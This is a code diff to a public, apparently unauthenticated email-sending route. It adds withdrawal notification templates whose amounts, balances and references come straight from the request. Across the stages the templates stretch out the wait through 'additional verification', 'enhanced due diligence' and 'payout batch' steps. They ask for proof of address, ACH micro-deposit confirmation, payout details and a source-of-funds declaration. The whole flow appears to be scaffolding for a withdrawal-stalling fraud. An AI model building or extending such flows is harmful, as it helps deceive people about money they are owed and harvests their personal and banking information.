@@ -1,12 +1,24 @@
 import { createFileRoute } from "@tanstack/react-router";
 
-type EmailTemplate = "access" | "email_3" | "email_6" | "email_consistency" | "email_42";
+type EmailTemplate =
+  | "access"
+  | "email_3"
+  | "email_6"
+  | "email_consistency"
+  | "email_42"
+  | "withdrawal_requested"
+  | "withdrawal_verification"
+  | "withdrawal_compliance"
+  | "withdrawal_batch"
+  | "withdrawal_scheduled";
 
 type AccessEmailBody = {
+  amount?: number;
   balance?: number;
   count?: number;
   email?: string;
   name?: string;
+  reference?: string;
   template?: EmailTemplate;
 };
 
@@ -37,9 +49,11 @@ export const Route = createFileRoute("/api/public/send-access-email")({
         }
 
         const template = buildEmailTemplate({
+          amount: Number(body.amount ?? 0),
           balance: Number(body.balance ?? 0),
           count: Number(body.count ?? 0),
           firstName,
+          reference: (body.reference ?? "").trim(),
           template: body.template ?? "access",
         });
 
@@ -69,9 +83,95 @@ export const Route = createFileRoute("/api/public/send-access-email")({
   },
 });
 
-function buildEmailTemplate(props: { balance: number; count: number; firstName: string; template: EmailTemplate }) {
+function buildEmailTemplate(props: { amount?: number; balance: number; count: number; firstName: string; reference?: string; template: EmailTemplate }) {
   const firstName = escapeHtml(props.firstName);
   const balance = usd(props.balance || 0);
+  const amount = usd(props.amount || props.balance || 0);
+  const reference = escapeHtml(props.reference || "");
+  const refLine = reference
+    ? `<p style="margin:0 0 16px;font-size:13px;line-height:1.6;color:#64748b;">Withdrawal reference: <strong style="color:#0f172a;">${reference}</strong></p>`
+    : "";
+
+  if (props.template === "withdrawal_requested") {
+    return {
+      subject: `Withdrawal request received — ${amount}`,
+      html: emailShell({
+        body: `
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">Hi ${firstName},</p>
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">We received your withdrawal request of <strong>${amount}</strong>. Your request has entered the standard payout review pipeline used for high-value creator partner payouts.</p>
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;color:#475569;">Current stage: <strong style="color:#0f172a;">Additional Verification</strong>. Open your dashboard to complete the pending verification items so your payout keeps moving through the pipeline.</p>
+          ${refLine}
+        `,
+        title: "Withdrawal request received",
+      }),
+    };
+  }
+
+  if (props.template === "withdrawal_verification") {
+    return {
+      subject: "Action required: Additional Verification",
+      html: emailShell({
+        body: `
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">Hi ${firstName},</p>
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">Your withdrawal of <strong>${amount}</strong> requires <strong>Additional Verification</strong> before it can be released. This step normally takes 3-5 business days.</p>
+          <p style="margin:0 0 12px;font-size:16px;line-height:1.6;color:#475569;">Pending items on your account:</p>
+          <ul style="margin:0 0 16px;padding-left:20px;font-size:15px;line-height:1.7;color:#475569;">
+            <li>Proof of address (utility bill or bank statement)</li>
+            <li>ACH micro-deposit confirmation</li>
+            <li>Re-confirmation of your payout details</li>
+          </ul>
+          ${refLine}
+        `,
+        title: "Additional Verification",
+      }),
+    };
+  }
+
+  if (props.template === "withdrawal_compliance") {
+    return {
+      subject: "Your account is under enhanced review",
+      html: emailShell({
+        body: `
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">Hi ${firstName},</p>
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">Verification is complete. Because of the withdrawal amount of <strong>${amount}</strong>, your account is now under <strong>Enhanced Due Diligence (compliance review)</strong>. This stage normally takes 5-7 business days.</p>
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;color:#475569;">To keep the review on schedule, confirm your source of funds and income declaration inside your dashboard. No further action is required after that; our compliance team completes the review automatically.</p>
+          ${refLine}
+        `,
+        title: "Compliance review in progress",
+      }),
+    };
+  }
+
+  if (props.template === "withdrawal_batch") {
+    return {
+      subject: "Withdrawal approved — added to the next payout batch",
+      html: emailShell({
+        body: `
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">Hi ${firstName},</p>
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">Good news: compliance review is complete and your withdrawal of <strong>${amount}</strong> has been <strong>approved</strong>.</p>
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;color:#475569;">Payouts are released in scheduled batches. Your withdrawal is now in the next payout batch and will be transmitted to your payout provider within 5-7 business days. You can follow the batch countdown in your dashboard.</p>
+          ${refLine}
+        `,
+        title: "Approved — next payout batch",
+      }),
+    };
+  }
+
+  if (props.template === "withdrawal_scheduled") {
+    return {
+      subject: "Your payout has been released",
+      html: emailShell({
+        body: `
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">Hi ${firstName},</p>
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;">Your payout batch has been transmitted and your withdrawal of <strong>${amount}</strong> has been released to your selected payout method.</p>
+          <p style="margin:0 0 16px;font-size:16px;line-height:1.6;color:#475569;">Depending on your provider, the credit posts to your account within 1-3 business days. Current account balance on record: <strong>${balance}</strong>.</p>
+          ${refLine}
+        `,
+        title: "Payout released",
+      }),
+    };
+  }
+
 
   if (props.template === "email_3") {
     return {
